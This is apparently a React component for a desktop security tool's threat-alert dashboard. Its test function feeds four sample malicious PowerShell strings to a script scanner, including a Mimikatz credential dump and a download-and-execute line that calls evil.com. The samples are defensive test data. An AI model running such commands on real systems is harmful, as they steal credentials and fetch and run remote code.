/**
 * ThreatAlertPanel - Advanced Detection Alerts Display
 *
 * Hiển thị real-time alerts từ Advanced Detection:
 * - DLL Injection Detection (Phase 8)
 * - Memory Shellcode Scanning (Phase 8)
 * - AMSI Script Analysis (Phase 8)
 * - Keylogger Detection (Phase 9)
 * - IAT Analysis (Phase 9)
 */

import React, { useState, useEffect, useCallback } from 'react';
import {
    getThreatAlerts,
    getAdvancedDetectionStats,
    scanScript,
    getKeyloggerAlerts,
    getKeyloggerStats,
} from '../services/tauriApi';
import '../styles/components/threat-alert-panel.css';

// Severity icons and colors
const SEVERITY_CONFIG = {
    CRITICAL: { icon: '🔴', color: '#ff4757', label: 'Critical' },
    HIGH: { icon: '🟠', color: '#ff6b35', label: 'High' },
    MEDIUM: { icon: '🟡', color: '#ffa502', label: 'Medium' },
    LOW: { icon: '🟢', color: '#2ed573', label: 'Low' },
};

// Alert type icons
const ALERT_TYPE_ICONS = {
    INJECTION: (
        <svg viewBox="0 0 24 24" fill="currentColor" className="alert-type-icon">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
        </svg>
    ),
    MEMORY: (
        <svg viewBox="0 0 24 24" fill="currentColor" className="alert-type-icon">
            <path d="M15 9H9v6h6V9zm-2 4h-2v-2h2v2zm8-2V9h-2V7c0-1.1-.9-2-2-2h-2V3h-2v2h-2V3H9v2H7c-1.1 0-2 .9-2 2v2H3v2h2v2H3v2h2v2c0 1.1.9 2 2 2h2v2h2v-2h2v2h2v-2h2c1.1 0 2-.9 2-2v-2h2v-2h-2v-2h2zm-4 6H7V7h10v10z" />
        </svg>
    ),
    AMSI: (
        <svg viewBox="0 0 24 24" fill="currentColor" className="alert-type-icon">
            <path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z" />
        </svg>
    ),
    KEYLOGGER: (
        <svg viewBox="0 0 24 24" fill="currentColor" className="alert-type-icon">
            <path d="M20 5H4c-1.1 0-1.99.9-1.99 2L2 17c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-9 3h2v2h-2V8zm0 3h2v2h-2v-2zM8 8h2v2H8V8zm0 3h2v2H8v-2zm-1 2H5v-2h2v2zm0-3H5V8h2v2zm9 7H8v-2h8v2zm0-4h-2v-2h2v2zm0-3h-2V8h2v2zm3 3h-2v-2h2v2zm0-3h-2V8h2v2z" />
        </svg>
    ),
    IAT: (
        <svg viewBox="0 0 24 24" fill="currentColor" className="alert-type-icon">
            <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z" />
        </svg>
    ),
};


function ThreatAlertPanel({
    maxAlerts = 10,
    refreshInterval = 5000,
    showStats = true,
    onAlertClick = null,
}) {
    const [alerts, setAlerts] = useState([]);
    const [stats, setStats] = useState(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);
    const [expandedAlert, setExpandedAlert] = useState(null);
    const [testing, setTesting] = useState(false);
    const [testResult, setTestResult] = useState(null);

    // Test detection với malicious scripts
    const testDetection = async () => {
        setTesting(true);
        setTestResult(null);

        const testScripts = [
            { content: 'Invoke-Mimikatz -DumpCreds', type: 'powershell' },
            { content: '[System.Convert]::FromBase64String($encoded)', type: 'powershell' },
            { content: 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com")', type: 'powershell' },
            { content: 'powershell -EncodedCommand JABzAD0A', type: 'powershell' },
        ];

        try {
            let detected = 0;
            for (const script of testScripts) {
                const result = await scanScript(script.content, script.type);
                if (result.should_block) detected++;
                console.log(`[Test] ${script.content.substring(0, 30)}... → ${result.threat_level}`);
            }
            setTestResult(`Detected ${detected}/${testScripts.length} threats!`);
            // Refresh sau khi test
            setTimeout(fetchAlerts, 500);
        } catch (err) {
            setTestResult(`Error: ${err.message}`);
        } finally {
            setTesting(false);
        }
    };

    // Fetch alerts
    const fetchAlerts = useCallback(async () => {
        try {
            const [alertsData, statsData] = await Promise.all([
                getThreatAlerts(maxAlerts),
                showStats ? getAdvancedDetectionStats() : null,
            ]);
            setAlerts(alertsData || []);
            if (statsData) setStats(statsData);
            setError(null);
        } catch (err) {
            console.error('Failed to fetch threat alerts:', err);
            setError(err.message);
        } finally {
            setLoading(false);
        }
    }, [maxAlerts, showStats]);

    // Initial fetch and polling
    useEffect(() => {
        fetchAlerts();
        const interval = setInterval(fetchAlerts, refreshInterval);
        return () => clearInterval(interval);
    }, [fetchAlerts, refreshInterval]);

    // Format timestamp
    const formatTime = (timestamp) => {
        const date = new Date(timestamp * 1000);
        return date.toLocaleTimeString('vi-VN', {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
        });
    };

    // Format relative time
    const formatRelativeTime = (timestamp) => {
        const now = Date.now() / 1000;
        const diff = now - timestamp;

        if (diff < 60) return 'Vừa xong';
        if (diff < 3600) return `${Math.floor(diff / 60)} phút trước`;
        if (diff < 86400) return `${Math.floor(diff / 3600)} giờ trước`;
        return `${Math.floor(diff / 86400)} ngày trước`;
    };

    // Handle alert click
    const handleAlertClick = (alert) => {
        setExpandedAlert(expandedAlert === alert.id ? null : alert.id);
        if (onAlertClick) onAlertClick(alert);
    };

    // Render stats cards
    const renderStats = () => {
        if (!stats) return null;

        return (
            <div className="threat-stats-grid">
                <div className="threat-stat-card">
                    <div className="stat-icon amsi">
                        {ALERT_TYPE_ICONS.AMSI}
                    </div>
                    <div className="stat-content">
                        <div className="stat-value">{stats.amsi_detections}</div>
                        <div className="stat-label">Script Threats</div>
                    </div>
                </div>
                <div className="threat-stat-card">
                    <div className="stat-icon injection">
                        {ALERT_TYPE_ICONS.INJECTION}
                    </div>
                    <div className="stat-content">
                        <div className="stat-value">{stats.injection_alerts}</div>
                        <div className="stat-label">Injections</div>
                    </div>
                </div>
                <div className="threat-stat-card">
                    <div className="stat-icon memory">
                        {ALERT_TYPE_ICONS.MEMORY}
                    </div>
                    <div className="stat-content">
                        <div className="stat-value">{stats.memory_detections}</div>
                        <div className="stat-label">Shellcode</div>
                    </div>
                </div>
                <div className="threat-stat-card">
                    <div className="stat-icon keylogger">
                        {ALERT_TYPE_ICONS.KEYLOGGER}
                    </div>
                    <div className="stat-content">
                        <div className="stat-value">{stats.keylogger_alerts || 0}</div>
                        <div className="stat-label">Keylogger</div>
                    </div>
                </div>
                <div className="threat-stat-card">
                    <div className="stat-icon iat">
                        {ALERT_TYPE_ICONS.IAT}
                    </div>
                    <div className="stat-content">
                        <div className="stat-value">{stats.iat_suspicious || 0}</div>
                        <div className="stat-label">IAT Suspicious</div>
                    </div>
                </div>
                <div className="threat-stat-card critical">
                    <div className="stat-icon critical-icon">
                        <svg viewBox="0 0 24 24" fill="currentColor">
                            <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z" />
                        </svg>
                    </div>
                    <div className="stat-content">
                        <div className="stat-value">{stats.total_critical}</div>
                        <div className="stat-label">Critical</div>
                    </div>
                </div>
            </div>
        );
    };

    // Render single alert
    const renderAlert = (alert) => {
        const severityConfig = SEVERITY_CONFIG[alert.severity] || SEVERITY_CONFIG.MEDIUM;
        const isExpanded = expandedAlert === alert.id;
        const typeIcon = ALERT_TYPE_ICONS[alert.alert_type] || ALERT_TYPE_ICONS.INJECTION;

        return (
            <div
                key={alert.id}
                className={`threat-alert-item ${alert.severity.toLowerCase()} ${isExpanded ? 'expanded' : ''}`}
                onClick={() => handleAlertClick(alert)}
            >
                <div className="alert-header">
                    <div className="alert-type-badge" data-type={alert.alert_type}>
                        {typeIcon}
                        <span>{alert.alert_type}</span>
                    </div>
                    <div className="alert-severity" style={{ color: severityConfig.color }}>
                        <span className="severity-dot" style={{ background: severityConfig.color }}></span>
                        {severityConfig.label}
                    </div>
                </div>

                <div className="alert-content">
                    <h4 className="alert-title">{alert.title}</h4>
                    <p className="alert-description">{alert.description}</p>
                </div>

                <div className="alert-meta">
                    {alert.mitre_id && (
                        <span className="mitre-tag">{alert.mitre_id}</span>
                    )}
                    <span className="alert-time" title={formatTime(alert.timestamp)}>
                        {formatRelativeTime(alert.timestamp)}
                    </span>
                    <span className="confidence-badge">
                        {alert.confidence}% confidence
                    </span>
                </div>

                {isExpanded && (
                    <div className="alert-details">
                        <div className="detail-grid">
                            {alert.source_process && (
                                <div className="detail-item">
                                    <span className="detail-label">Source:</span>
                                    <span className="detail-value">
                                        {alert.source_process} (PID: {alert.source_pid})
                                    </span>
                                </div>
                            )}
                            {alert.target_process && (
                                <div className="detail-item">
                                    <span className="detail-label">Target:</span>
                                    <span className="detail-value">
                                        {alert.target_process} (PID: {alert.target_pid})
                                    </span>
                                </div>
                            )}
                            {alert.details && (
                                <div className="detail-item full-width">
                                    <span className="detail-label">Details:</span>
                                    <pre className="detail-json">
                                        {JSON.stringify(alert.details, null, 2)}
                                    </pre>
                                </div>
                            )}
                        </div>
                    </div>
                )}
            </div>
        );
    };

    // Loading state
    if (loading) {
        return (
            <div className="threat-alert-panel loading">
                <div className="panel-header">
                    <h3>Advanced Threat Detection</h3>
                </div>
                <div className="loading-spinner">
                    <div className="spinner"></div>
                    <span>Loading threats...</span>
                </div>
            </div>
        );
    }

    // Error state
    if (error) {
        return (
            <div className="threat-alert-panel error">
                <div className="panel-header">
                    <h3>Advanced Threat Detection</h3>
                </div>
                <div className="error-message">
                    <span>⚠️ {error}</span>
                    <button onClick={fetchAlerts}>Retry</button>
                </div>
            </div>
        );
    }

    return (
        <div className="threat-alert-panel">
            <div className="panel-header">
                <div className="header-left">
                    <svg viewBox="0 0 24 24" fill="currentColor" className="header-icon">
                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" />
                    </svg>
                    <h3>Advanced Threat Detection</h3>
                </div>
                <div className="header-right">
                    <span className="alert-count">
                        {alerts.length} alerts
                    </span>
                    <button
                        className="test-btn"
                        onClick={testDetection}
                        disabled={testing}
                        title="Test Detection"
                    >
                        {testing ? 'Testing...' : '🧪 Test'}
                    </button>
                    <button className="refresh-btn" onClick={fetchAlerts} title="Refresh">
                        <svg viewBox="0 0 24 24" fill="currentColor">
                            <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z" />
                        </svg>
                    </button>
                </div>
            </div>

            {testResult && (
                <div className={`test-result ${testResult.includes('Error') ? 'error' : 'success'}`}>
                    {testResult}
                </div>
            )}

            {showStats && renderStats()}

            <div className="alerts-container">
                {alerts.length === 0 ? (
                    <div className="no-alerts">
                        <svg viewBox="0 0 24 24" fill="currentColor" className="shield-icon">
                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 6h2v6h-2V7zm0 8h2v2h-2v-2z" />
                        </svg>
                        <span>No threats detected</span>
                        <p>System is protected</p>
                    </div>
                ) : (
                    <div className="alerts-list">
                        {alerts.map(renderAlert)}
                    </div>
                )}
            </div>
        </div>
    );
}

export default ThreatAlertPanel;
